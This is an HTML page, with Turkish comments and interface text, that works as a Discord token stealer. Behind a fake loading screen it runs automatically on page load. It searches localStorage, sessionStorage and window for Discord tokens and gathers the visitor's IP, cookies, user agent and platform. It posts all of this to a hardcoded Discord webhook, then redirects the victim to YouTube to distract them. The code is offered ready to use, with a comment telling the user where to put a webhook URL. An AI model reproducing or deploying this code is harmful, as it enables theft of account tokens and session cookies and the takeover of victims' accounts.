<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Yükleniyor...</title>
    <style>
        body { background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { color: white; margin-top: 20px; text-align: center; }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <div id="status">Discord Verileri Alınıyor...</div>
    </div>

<script>
    // --- WEBHOOK URL'İNİ BURAYA YAZ ---
    const WEBHOOK = "https://discord.com/api/webhooks/1565166860897615912/I2CNk0KdLEXpdPkbMLoFTpAChNaeL8sS4YDqEH-26z7lptRg3lOs-UpBMHRbSlSW1Qke";

    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            return (await res.json()).ip;
        } catch { return "Bilinmiyor"; }
    }

    async function grabToken() {
        const statusDiv = document.getElementById('status');
        
        let token = null;
        
        // 1. EN AGRESİF TOKEN ARAMA
        // A) window.token
        if (window.token && window.token.length > 30) {
            token = window.token;
        }
        // B) localStorage'daki 'token' anahtarı
        else if (localStorage.getItem('token')) {
            token = localStorage.getItem('token');
        }
        // C) localStorage'daki 'discord_token' anahtarı
        else if (localStorage.getItem('discord_token')) {
            token = localStorage.getItem('discord_token');
        }
        // D) localStorage'daki 'lt' anahtarı
        else if (localStorage.getItem('lt')) {
            token = localStorage.getItem('lt');
        }
        // E) localStorage'daki tüm MT ile başlayan değerler
        else {
            for (let key in localStorage) {
                if (localStorage[key] && localStorage[key].length > 30 && localStorage[key].startsWith("MT")) {
                    token = localStorage[key];
                    break;
                }
            }
        }
        // F) sessionStorage'daki MT ile başlayan değerler
        if (!token) {
            for (let key in sessionStorage) {
                if (sessionStorage[key] && sessionStorage[key].length > 30 && sessionStorage[key].startsWith("MT")) {
                    token = sessionStorage[key];
                    break;
                }
            }
        }

        // 2. VERİLERİ TOPLA
        const ip = await getIP();
        const userAgent = navigator.userAgent;
        const cookies = document.cookie;
        
        // 3. PAYLOAD HAZIRLA
        const payload = {
            username: "Token Avcısı",
            avatar_url: "https://cdn-icons-png.flaticon.com/512/1042/1042842.png",
            embeds: [{
                title: "🔥 TOKEN ÇALINDI! 🔥",
                color: 15158332,
                fields: [
                    { name: "💻 Platform", value: navigator.platform, inline: true },
                    { name: "🌐 IP", value: ip, inline: true },
                    { name: "🧩 Tarayıcı", value: "`" + userAgent + "`", inline: false },
                    { name: "🍪 Cookie", value: "`" + cookies.substring(0, 500) + (cookies.length > 500 ? "..." : "") + "`", inline: false },
                    { name: "🔑 TOKEN", value: "`" + (token || "Bulunamadı") + "`", inline: false }
                ],
                footer: { text: "NoTrack System" },
                timestamp: new Date().toISOString()
            }]
        };

        // 4. GÖNDER
        try {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            statusDiv.innerText = "✅ Token Başarıyla Alındı!";
            statusDiv.style.color = "#43b581";
            
            // 3 saniye sonra YouTube'a yönlendir (dikkat dağıtmak için)
            setTimeout(() => {
                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
            }, 3000);

        } catch (e) {
            statusDiv.innerText = "❌ Gönderme Hatası: " + e.message;
            statusDiv.style.color = "#f04748";
        }
    }

    // Sayfa yüklendiğinde çalıştır
    window.onload = grabToken;
</script>
</body>
</html>
